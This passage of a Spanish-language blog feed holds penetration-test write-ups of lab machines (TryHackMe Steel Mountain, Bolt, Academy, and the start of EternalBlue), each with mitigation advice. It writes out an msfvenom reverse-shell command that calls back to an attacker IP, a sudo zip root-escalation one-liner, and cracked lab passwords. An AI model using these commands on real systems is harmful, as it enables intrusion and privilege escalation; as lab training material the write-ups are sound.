<div>]]></content:encoded>
    </item>
    <item>
      <title>Steel Mountain (THM)</title>
      <link>https://gtello.github.io/es/writeups/steelmountain/</link>
      <pubDate>Tue, 12 Nov 2024 22:40:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/steelmountain/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://www.tryhackme.com/room/steelmountain&#34;&gt;Steel Mountain&lt;/a&gt; de TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Encontramos varias vulnerabilidades que nos permitieron obtener acceso no autorizado al sistema. Primero, encontramos servicios en los puertos 80 y 8080 que exponían información sensible. Luego, usando un exploit en uno de estos servicios, conseguimos acceso al sistema con una reverse shell.&lt;/p&gt;&#xA;&lt;p&gt;Después, escalamos privilegios y logramos permisos de administrador gracias a una mala configuración de permisos en uno de los servicios del sistema, lo cual nos dio acceso a archivos críticos y nos permitió llegar hasta información confidencial.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Writeup de la máquina <a href="https://www.tryhackme.com/room/steelmountain">Steel Mountain</a> de TryHackMe.</p>
<h2 id="resumen">Resumen</h2>
<p>Encontramos varias vulnerabilidades que nos permitieron obtener acceso no autorizado al sistema. Primero, encontramos servicios en los puertos 80 y 8080 que exponían información sensible. Luego, usando un exploit en uno de estos servicios, conseguimos acceso al sistema con una reverse shell.</p>
<p>Después, escalamos privilegios y logramos permisos de administrador gracias a una mala configuración de permisos en uno de los servicios del sistema, lo cual nos dio acceso a archivos críticos y nos permitió llegar hasta información confidencial.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Empezamos con un escaneo de red con nmap para ver qué puertos estaban abiertos y qué servicios corrían en ellos.</p>
<div>
  <img src="/images/posts/steelmountain/image1.png" alt="Resultado nmap" />
</div>
<center><em>Figura 1:</em> Resultado nmap</center>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Sistema Operativo</th>
          <th style="text-align: left">Dirección IP</th>
          <th style="text-align: left">Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Windows Server 2008</td>
          <td style="text-align: left">10.10.128.109</td>
          <td style="text-align: left">80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
      </tr>
  </tbody>
</table>
<h2 id="explotación">Explotación</h2>
<p>Al investigar el puerto 80 en el navegador, encontramos la página de inicio de Steel Mountain con un &ldquo;Empleado del Mes&rdquo; llamado Bill Harper (nombre tomado del archivo de la imagen). En el puerto 8080, descubrimos un servidor Rejetto HTTP que estaba expuesto y vulnerable a un exploit de ejecución remota de comandos (Remote Command Execution) en la versión 2.3.x de HFS. Usamos metasploit para lanzar el exploit y obtener una conexión reverse shell en el servidor. En el escritorio del usuario se encuentra la primera bandera.</p>
<div style="text-align: center;">
  <img width="1000" src="/images/posts/steelmountain/image2.png" alt="steelmountain" />
</div>
<center><em>Figura 2:</em> Homepage de Steel Mountain</center>
<br>
<div style="text-align: center;">
  <img src="/images/posts/steelmountain/image3.png" alt="hfs http file server" />
</div>
<center><em>Figura 3:</em> Servidor Rejetto HTTP expuesto</center>
<br>
<div style="text-align: center;">
  <img src="/images/posts/steelmountain/image4.png" alt="shell metasploit" />
</div>
<center><em>Figura 4:</em> Shell obtenido en metasploit</center>
<h2 id="escalación-de-privilegios">Escalación de privilegios</h2>
<p>Con acceso inicial al sistema, ejecutamos el script <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> en PowerShell para buscar posibles problemas de configuración en el sistema Windows. El script detectó que el servicio <code>AdvancedSystemCareService9</code> tenía configuraciones de permisos mal configuradas:</p>
<ul>
<li>La ruta del servicio no tenía comillas y tenía espacios, lo que es vulnerable en Windows.</li>
<li>El servicio estaba configurado con permisos modificables, lo que permite a usuarios sin privilegios hacer cambios.</li>
</ul>
<div style="text-align: center;">
  <img width="1000" src="/images/posts/steelmountain/image5.png" alt="script powerup" />
</div>
<center><em>Figura 5:</em> Uso de script PowerUp</center>
<p>Creamos un payload de reverse shell con msfvenom usando el comando:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o CleanupService.exe</span></span></code></pre></div><p>Este comando generó un ejecutable <code>CleanupService.exe</code> con un payload de revervse shell hacia nuestra máquina. Subimos este archivo al servidor, reemplazamos el ejecutable legítimo del servicio y lo reiniciamos con <code>sc stop</code> y <code>sc start</code>, ejecutando así nuestro payload y obteniendo acceso de administrador.</p>
<div style="text-align: center;">
  <img width="1000" src="/images/posts/steelmountain/image6.png" alt="ejecutable reemplazado" />
</div>
<center><em>Figura 6:</em> Ejecutable reemplazado</center>
<p>Una vez dentro del sistema se consiguió la bandera final.</p>
<div style="text-align: center;">
  <img src="/images/posts/steelmountain/image7_1.png" alt="acceso a system" /><br>
  <img src="/images/posts/steelmountain/image7_2.png" alt="bandera" />
</div>
<center><em>Figura 7:</em> Acceso a cuenta Administrador</center>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Herramienta</th>
          <th style="text-align: left">Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">nmap</td>
          <td style="text-align: left">Para el reconocimiento inicial y detección de servicios y puertos abiertos.</td>
      </tr>
      <tr>
          <td style="text-align: left">metasploit</td>
          <td style="text-align: left">Para lanzar el exploit contra el servidor Rejetto HTTP.</td>
      </tr>
      <tr>
          <td style="text-align: left">PowerUp.ps1</td>
          <td style="text-align: left">Script de PowerShell para analizar configuraciones de privilegios en sistemas Windows.</td>
      </tr>
      <tr>
          <td style="text-align: left">msfvenom</td>
          <td style="text-align: left">Para generar el payload de reverse shell que ejecutamos para obtener permisos de administrador.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>Esta máquina era bastante vulnerable, con servicios web mal configurados y permisos inseguros en algunos servicios, lo que hizo relativamente fácil tanto el acceso inicial como la escalación de privilegios.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Para mejorar la seguridad:</p>
<ol>
<li>Restringir el acceso a puertos no esenciales y limitar el acceso a IPs confiables.</li>
<li>Actualizar o reemplazar el servidor Rejetto HTTP para cerrar posibles vulnerabilidades.</li>
<li>Revisar y ajustar las configuraciones de servicios, asegurándose de que las rutas estén entre comillas y los permisos de modificación sean seguros.</li>
<li>Implementar monitoreo y control de accesos en tiempo real para detectar cualquier actividad no autorizada en el sistema.</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Máquina Bolt</title>
      <link>https://gtello.github.io/es/writeups/bolt/</link>
      <pubDate>Thu, 31 Oct 2024 18:03:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/bolt/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Debian.&#xD;&#xA;&lt;h2 id=&#34;resumen-ejecutivo&#34;&gt;Resumen ejecutivo&lt;/h2&gt;&#xA;&lt;p&gt;Este informe describe una evaluación de seguridad en la que se identificaron y explotaron varias vulnerabilidades críticas en la máquina Bolt. Durante el reconocimiento, se encontraron servicios expuestos, como un error en Bolt CMS y una página de información de PHP. Estos descubrimientos llevaron a la extracción de credenciales sensibles y a la explotación de una vulnerabilidad que permitió acceder a archivos importantes del sistema.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Debian.
<h2 id="resumen-ejecutivo">Resumen ejecutivo</h2>
<p>Este informe describe una evaluación de seguridad en la que se identificaron y explotaron varias vulnerabilidades críticas en la máquina Bolt. Durante el reconocimiento, se encontraron servicios expuestos, como un error en Bolt CMS y una página de información de PHP. Estos descubrimientos llevaron a la extracción de credenciales sensibles y a la explotación de una vulnerabilidad que permitió acceder a archivos importantes del sistema.</p>
<p>Además, se detectó un recurso compartido NFS que contenía un archivo protegido por contraseña. Mediante el uso de técnicas de fuerza bruta, se logró descifrar el archivo y obtener una clave SSH, lo que permitió acceder al sistema como un usuario identificado. Finalmente, se aprovechó una configuración de permisos incorrecta para elevar los privilegios y obtener acceso root al sistema, logrando control completo de la máquina.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Se realizó un escaneo de red utilizando la herramienta nmap para identificar puertos y servicios abiertos en la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image1.png" alt="Resultado nmap" />
</div>
<center><em>Figura 1:</em> Resultado nmap</center>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Sistema Operativo</th>
          <th style="text-align: left">Dirección IP</th>
          <th style="text-align: left">Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Debian</td>
          <td style="text-align: left">192.168.138.132</td>
          <td style="text-align: left">22 (SSH), 80 (HTTP), 111 (RPCbind), 2049 (NFS), 8080 (HTTP Alternate)</td>
      </tr>
  </tbody>
</table>
<h2 id="explotación">Explotación</h2>
<p>El escaneo de nmap mostró que el puerto 80 y 8080 estaba abierto, se procedió a investigar en el navegador. Se encontró una página de error, aparentemente de Bolt CMS.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image2.png" alt="error instalación bolt" />
</div>
<center><em>Figura 2:</em> Error de instalación de Bolt</center>
<p>En el puerto 8080 está expuesta una página de información de PHP. Se procedió a hacer fuerza bruta a los directorios de ambos puertos.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image3.png" alt="php info page" />
</div>
<center><em>Figura 3:</em> Página de información de PHP</center>
<p>En el puerto 8080 está expuesta una página de información de PHP. Se procedió a hacer fuerza bruta a los directorios de ambos puertos.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image4.png" alt="fuerza bruta a directorios" />
</div>
<center><em>Figura 4:</em> Fuerza bruta a directorios del puerto 80</center>
<p>Dentro del directorio /app, se encontró un archivo <code>config.yml</code> que contenía credenciales de SQLite.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image5.png" alt="credenciales expuestas" />
</div>
<center><em>Figura 5:</em> Credenciales expuestas en archivo config.yml</center>
<p>En cambio, los resultados de fuerza bruta en los directorios para el puerto 8080 retornaron un solo resultado, el cual fue el directorio <code>/dev</code>.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image6.png" alt="boltwire" />
</div>
<center><em>Figura 6:</em> Página de inicio de BoltWire</center>
<p>Se procedió a interactuar con la página de BoltWire, pero no se encontró nada de interés. Se buscaron vulnerabilidades en Internet y se probó una vulnerabilidad de <a href="https://www.exploit-db.com/exploits/48411">local file inclusion</a>.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image7.png" alt="LFI" />
</div>
<center><em>Figura 7:</em> Local file inclusion</center>
<p>El archivo <code>/etc/passwd</code> pudo ser examinado debido al LFI y se encontró un potencial usuario, <code>jeanpaul</code>.</p>
<p>Simultáneamente, se enumeró el puerto 2049 (NFS). Utilizando el comando <code>showmount -e</code> se reveló que el directorio <code>/srv/nfs</code> estaba compartido con rangos de IP específicos.</p>
<p>Luego, se creó un directorio local <code>/mnt/dev</code> para usarlo como punto de montaje. Posteriormente, se montó el recurso compartido NFS <code>/srv/nfs</code> de la máquina en el directorio local utilizando el comando <code>mount</code>. Al navegar a <code>/mnt/dev</code>, se descubrió un archivo llamado <code>save.zip</code>.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image8.png" alt="enumeración NFS" />
</div>
<center><em>Figura 8:</em> Enumeración de NFS</center>
<p>El archivo zip tiene una contraseña, se utilizó la herramienta <code>fcrackzip</code> con un diccionario de contraseñas (<code>rockyou.txt</code>) para intentar descifrar la contraseña del archivo <code>save.zip</code>. El comando tuvo éxito y reveló que la contraseña era <code>java101</code>.</p>
<p>A continuación, se descomprimió el archivo <code>save.zip</code> usando sudo unzip y se ingresó la contraseña descubierta. Esto extrajo tres archivos: <code>bandera1.txt</code>, <code>id_rsa</code>, y <code>todo.txt</code>.</p>
<p>El archivo <code>bandera1.txt</code> contenía una cadena hash, mientras que el archivo <code>todo.txt</code> incluía instrucciones relacionadas con la gestión del sitio web y una recomendación de seguir programando en Java, este archivo fue firmado por <code>jp</code> el cual podría ser el usuario <code>jeanpaul</code> encontrado anteriormente.</p>
<p>Debido a esto, se intentó usar el archivo <code>id_rsa</code> para conectarse a la máquina con el usuario <code>jeanpaul</code>, usando las credenciales ya conocidas hasta el momento.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image9.png" alt="crack de archivo zip" />
</div>
<center><em>Figura 9:</em> Crack del archivo zip</center>
<p>La contraseña encontrada en el archivo de configuración anteriormente fue la contraseña correcta para el usuario jeanpaul, una vez dentro de la máquina se procedió a escalar privilegios.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image10.png" alt="log in" />
</div>
<center><em>Figura 10:</em> Log in con usuario jeanpaul</center>
<h3 id="escalación-de-privilegios">Escalación de privilegios</h3>
<p>Con el uso del comando <code>sudo -l</code>, se observó que el usuario actual podía usar el comando <code>zip</code> como usuario root sin necesidad de una contraseña. Se utilizó una técnica de escalada de privilegios tomada de la página <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">GTFObins</a>, la cual proporciona métodos para explotar binarios con permisos especiales mediante sudo. En este caso, se aprovechó del binario <code>zip</code> para ejecutar comandos con privilegios elevados.</p>
<p>El proceso comenzó con la creación de un archivo temporal mediante el comando <code>TF=$(mktemp -u)</code>, que generó un nombre de archivo único sin llegar a crear el archivo físicamente, almacenándolo en la variable <code>TF</code>. Luego, se ejecutó <code>zip</code> con privilegios de superusuario usando el comando <code>sudo zip $TF /etc/hosts -T -TT 'sh #'</code>. Aquí, <code>zip</code> fue configurado para ejecutar el intérprete de comandos <code>sh</code>, utilizando <code>/etc/hosts</code> como un archivo dummy solo para cumplir con los requerimientos del binario. Las opciones <code>-T</code> y <code>-TT</code> permitieron que <code>sh</code> se ejecutara con permisos elevados. Finalmente, se eliminó el archivo temporal con <code>sudo rm $TF</code> para limpiar los rastros del ataque. Esta secuencia permitió obtener acceso root a la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image11.png" alt="escalada a root" />
</div>
<center><em>Figura 11:</em> Escalada a root</center>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Herramienta</th>
          <th style="text-align: left">Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">nmap</td>
          <td style="text-align: left">Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
      </tr>
      <tr>
          <td style="text-align: left">fcrackzip</td>
          <td style="text-align: left">Herramienta empleada para realizar un ataque de fuerza bruta a archivos zip.</td>
      </tr>
      <tr>
          <td style="text-align: left">wfuzz</td>
          <td style="text-align: left">Usada para realizar fuerza bruta en los directorios web, descubriendo rutas sensibles.</td>
      </tr>
      <tr>
          <td style="text-align: left">GTFObins</td>
          <td style="text-align: left">Recurso en línea que proporcionó el método para escalar privilegios utilizando el binario zip con permisos especiales de sudo.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>La evaluación de seguridad en la máquina Bolt reveló vulnerabilidades críticas que permitieron obtener acceso completo al sistema, desde la extracción de credenciales hasta la escalada de privilegios a root. Estos problemas se originaron principalmente por configuraciones incorrectas, exposición de información sensible y la falta de actualizaciones de seguridad. Si bien se logró explotar con éxito estas vulnerabilidades, la implementación de las recomendaciones sugeridas puede mitigar riesgos similares en el futuro y fortalecer la seguridad general de la máquina.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Se recomienda actualizar y parchear el software del servidor y las aplicaciones, como Bolt CMS, para protegerse de vulnerabilidades conocidas. Restringir el acceso a información sensible deshabilitando o restringiendo las páginas de información del sistema, como <code>phpinfo()</code>, que exponen detalles críticos a posibles atacantes. Asegurar archivos y configuraciones almacenando credenciales de manera segura y cifrada, además de implementar políticas de acceso que limiten la visibilidad de archivos sensibles como config.yml. Reforzar las configuraciones de NFS para limitar el acceso a recursos compartidos mediante configuraciones más restrictivas, asegurando que solo usuarios autorizados puedan acceder. Revisar los permisos sudo para evitar que usuarios ejecuten binarios potencialmente explotables, como en este caso fue <code>zip</code>, con privilegios de root. Mejorar la gestión de claves SSH implementando medidas para proteger las claves privadas y limitando el acceso SSH a usuarios confiables.</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Máquina Academy</title>
      <link>https://gtello.github.io/es/writeups/academy/</link>
      <pubDate>Thu, 24 Oct 2024 21:22:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/academy/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Debian 10 llamada Academy, que en este caso cambió el nombre de la máquina a Monkey. &#xD;&#xA;&lt;h2 id=&#34;resumen-ejecutivo&#34;&gt;Resumen ejecutivo&lt;/h2&gt;&#xA;&lt;p&gt;Se llevó a cabo un análisis de seguridad en la máquina Monkey (Debian 10). Se identificaron varias vulnerabilidades, comenzando con un servicio FTP mal configurado que permitía el inicio de sesión anónimo, lo que facilitó el acceso a información crítica, como credenciales y un hash de contraseña. A través de fuerza bruta en los directorios web y un ataque de subida de archivos no restringido, se consiguió hacer una conexión no autorizada al servidor. Posteriormente, se escaló el acceso a usuario administrador, modificando un script en bash que se ejecutaba con privilegios elevados.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Debian 10 llamada Academy, que en este caso cambió el nombre de la máquina a Monkey. 
<h2 id="resumen-ejecutivo">Resumen ejecutivo</h2>
<p>Se llevó a cabo un análisis de seguridad en la máquina Monkey (Debian 10). Se identificaron varias vulnerabilidades, comenzando con un servicio FTP mal configurado que permitía el inicio de sesión anónimo, lo que facilitó el acceso a información crítica, como credenciales y un hash de contraseña. A través de fuerza bruta en los directorios web y un ataque de subida de archivos no restringido, se consiguió hacer una conexión no autorizada al servidor. Posteriormente, se escaló el acceso a usuario administrador, modificando un script en bash que se ejecutaba con privilegios elevados.</p>
<p>Esto permitió obtener control total del servidor y acceder a información confidencial. Se detectaron múltiples problemas de configuración y control de acceso que deben ser corregidos para mejorar la seguridad de la máquina y sus servicios.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Se realizó un escaneo de red utilizando la herramienta nmap para identificar puertos y servicios abiertos en la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image1.png" alt="Resultado nmap" />
</div>
<center><em>Figura 1:</em> Resultado nmap</center>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Sistema Operativo</th>
          <th style="text-align: left">Dirección IP</th>
          <th style="text-align: left">Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Debian 10</td>
          <td style="text-align: left">192.168.138.128</td>
          <td style="text-align: left">21 (FTP), 22 (SSH), 80 (HTTP)</td>
      </tr>
  </tbody>
</table>
<h2 id="explotación">Explotación</h2>
<p>El escaneo de nmap mostró que el servicio FTP en el puerto 21 permitía un inicio de sesión anónimo, por lo que se realizó la prueba.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image2.png" alt="inicio sesion ftp" />
</div>
<center><em>Figura 2:</em> Inicio de sesión FTP como usuario anónimo</center>
<p>La conexión a FTP se encontró abierta para el usuario anonymous, lo que permitió acceder a una nota dejada en el servidor.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image3.png" alt="nota desarrollador" />
</div>
<center><em>Figura 3:</em> Nota del desarrollador</center>
<p>Se pudo observar que el desarrollador dejó una nota en el servidor FTP, en donde se mencionó que tuvo que recurrir a usar una sentencia SQL para la creación de un nuevo usuario para el sitio web de la academia. El valor en el campo <code>password</code> es un hash MD5, se procedió a crackear el hash en hashcat.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image4.png" alt="resultado hashcat 1" />
    <img src="/images/posts/academy/image4_1.png" alt="resultado hashcat 2" />
</div>
<center><em>Figura 4:</em> Resultado hashcat</center>
<p>El crackeo del hash fue exitoso, y se determinó que la contraseña del usuario <code>HackerMentor</code> es <code>junior01</code>. Para proceder, se empezó a analizar el puerto 80 abierto que sugería que había una página web sirviendo contenido desde la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image5.png" alt="apache web server" />
</div>
<center><em>Figura 5:</em> Servicio de Apache Web Server</center>
<p>Se encontró la página web por defecto de Apache, lo que nos confirma que esta máquina está alojando un servicio web. Se procedió a hacer fuerza bruta en los directorios web.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image6.png" alt="wfuzz" />
</div>
<center><em>Figura 6:</em> Fuerza bruta en directorios web con wfuzz</center>
<p>Se descubrieron los directorios web, uno de <code>/phpmyadmin</code> y un directorio <code>/monkey</code>.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image7.png" alt="portal de academy" />
</div>
<center><em>Figura 7:</em> Portal de inicio de sesión de Academy</center>
<p>Se utilizaron las credenciales descubiertas anteriormente, y se consiguió iniciar sesión dentro del portal de Monkey. Se procedió a revisar detenidamente esta página web y se encontró un apartado de inscripción de estudiantes, el cual permitía hacer subida de imágenes. Se probó un ataque llamado <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">subida de archivos no restringida</a> para de esta manera intentar ejecutar código PHP en el servidor web y conseguir un reverse shell.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image8.png" alt="código php" />
</div>
<center><em>Figura 8:</em> Código para reverse shell en PHP</center>
<p>Se subió este archivo .php al servidor y como previamente se hizo una prueba subiendo un archivo de imagen, se descubrió que la ruta donde quedan alojadas las imágenes es <code>http://192.168.138.128/monkey/studentphoto/imagen.jpg</code>. Una vez subida la imagen se ejecutó el código y se abrió una conexión con netcat en el puerto 1234.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image9.png" alt="conexión reverse shell" />
</div>
<center><em>Figura 9:</em> Conexión de tipo reverse shell establecida</center>
<p>El exploit funcionó correctamente y se consiguió acceso al servidor a través del usuario www-data, para hacer escalación de privilegios, se utilizó el script <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LINpeas.sh</a>. Para realizar la transferencia del archivo hacia el servidor, se creó un servidor HTTP básico con Python con el comando python3 -m http.server 80 para descargar el archivo desde el servidor. Se ejecutó el script para descubrir vías para escalación de permisos y se hicieron los siguientes hallazgos.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image10.png" alt="contraseña mysql" />
</div>
<center><em>Figura 10:</em> Contraseña en texto plano de base de datos MySQL</center>
<p>Una vez encontrada la contraseña se intentó usar en conjunto con el usuario ya conocido dentro del portal web de la academia para conectarse a ese usuario mediante SSH.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image11.png" alt="ssh session" />
</div>
<center><em>Figura 11:</em> Conexión por SSH al usuario hackermentor</center>
<p>Se encontró una bandera y un script en bash llamado backup.sh que hace un respaldo a los archivos del sitio web de la academia. Se usó el comando <code>ls -l</code> y se nota que esta script se ejecuta a través del usuario administrador, revisando con <code>crontab</code> y <code>systemd</code> no se pudo determinar si este script se encuentra automatizado, para confirmación se utilizó el programa <a href="https://github.com/DominicBreuker/pspy">pspy</a>, que sirve para monitorear procesos en Linux sin permisos root.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image12.png" alt="monitoreo de procesos" />
</div>
<center><em>Figura 12:</em> Monitoreo de procesos con pspy mostrando la ejecución del script</center>
<p>Se pudo observar que el script está siendo ejecutado como usuario root. Debido a que el usuario <code>hackermentor</code> tiene permisos para editar este archivo, se pudo modificar este script para hacer que se ejecute un reverse shell, y ya que este script se ejecuta como usuario root, se obtuvo conexión a la máquina como usuario administrador.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image13.png" alt="backup.sh modificado" />
</div>
<center><em>Figura 13:</em> backup.sh modificado</center>
<pre>

</pre>
<div style="text-align: center;">
  <img src="/images/posts/academy/image14.png" alt="conexión a root" />
</div>
<center><em>Figura 14:</em> Conexión a usuario root</center>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Herramienta</th>
          <th style="text-align: left">Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Nmap</td>
          <td style="text-align: left">Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
      </tr>
      <tr>
          <td style="text-align: left">hashcat</td>
          <td style="text-align: left">Utilizada para crackear el hash MD5 obtenido del servidor FTP.</td>
      </tr>
      <tr>
          <td style="text-align: left">wfuzz</td>
          <td style="text-align: left">Usada para realizar fuerza bruta en los directorios web, descubriendo rutas sensibles.</td>
      </tr>
      <tr>
          <td style="text-align: left">pspy</td>
          <td style="text-align: left">Programa utilizado para monitorear procesos en Linux sin necesidad de permisos root.</td>
      </tr>
      <tr>
          <td style="text-align: left">LinPEAS</td>
          <td style="text-align: left">Script utilizado para identificar potenciales vías de escalación de privilegios en el servidor.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>Durante este análisis de seguridad, se descubrieron varias vulnerabilidades críticas en la máquina Monkey. El acceso inicial se logró a través de un servicio FTP mal configurado que permitía inicios de sesión anónimos, lo que facilitó el acceso a archivos sensibles. A partir de ahí, se descubrieron credenciales de usuario que, junto con otros ataques, posibilitaron el acceso a la web y la posterior ejecución de código remoto en el servidor. La falta de restricciones en la subida de archivos y la presencia de un script ejecutado con permisos elevados sin las debidas protecciones permitió escalación de privilegios hasta obtener acceso como root. La combinación de una mala gestión de permisos, configuraciones inseguras y la falta de controles robustos de autenticación permitió que se comprometa completamente el sistema.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Para mitigar las vulnerabilidades identificadas, se debe deshabilitar el inicio de sesión anónimo en el servicio FTP y restringir el acceso solo a usuarios autenticados. Asegurar que las contraseñas nunca sean almacenadas en texto plano y que los hashes utilicen algoritmos más robustos.
En cuanto a la escalación de privilegios, es necesario revisar y restringir los permisos de usuarios sobre scripts críticos como <code>backup.sh</code>, evitando que usuarios no privilegiados puedan modificarlos. También es recomendable realizar un monitoreo continuo del sistema con herramientas como pspy para detectar actividades anómalas en los procesos.</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Máquina Eternal (EternalBlue)</title>
      <link>https://gtello.github.io/es/writeups/eternalblue/</link>
      <pubDate>Fri, 18 Oct 2024 09:15:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/eternalblue/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Windows 7.&#xD;&#xA;&lt;h2 id=&#34;resumen-ejecutivo&#34;&gt;Resumen ejecutivo&lt;/h2&gt;&#xA;&lt;p&gt;Durante la prueba de penetración se descubrió que la máquina Eternal (Windows 7) era vulnerable al exploit EternalBlue (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/cve-2017-0144&#34;&gt;CVE-2017-0144&lt;/a&gt;). Este exploit permite a un atacante no autenticado ejecutar código arbitrario de forma remota y obtener control total del sistema. La vulnerabilidad fue utilizada para comprometer la máquina Eternal, lo que permitió acceso a datos sensibles y a otros sistemas en la red. Este informe detalla el proceso de explotación, los hallazgos y las recomendaciones para mitigar esta vulnerabilidad.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Windows 7.
<h2 id="resumen-ejecutivo">Resumen ejecutivo</h2>
<p>Durante la prueba de penetración se descubrió que la máquina Eternal (Windows 7) era vulnerable al exploit EternalBlue (<a href="https://nvd.nist.gov/vuln/detail/cve-2017-0144">CVE-2017-0144</a>). Este exploit permite a un atacante no autenticado ejecutar código arbitrario de forma remota y obtener control total del sistema. La vulnerabilidad fue utilizada para comprometer la máquina Eternal, lo que permitió acceso a datos sensibles y a otros sistemas en la red. Este informe detalla el proceso de explotación, los hallazgos y las recomendaciones para mitigar esta vulnerabilidad.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Se realizó un escaneo de red utilizando la herramienta nmap para identificar puertos y servicios abiertos en la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image1.png" alt="comando nmap" />
</div>
<center><em>Figura 1:</em> Comando nmap y resultados</center>
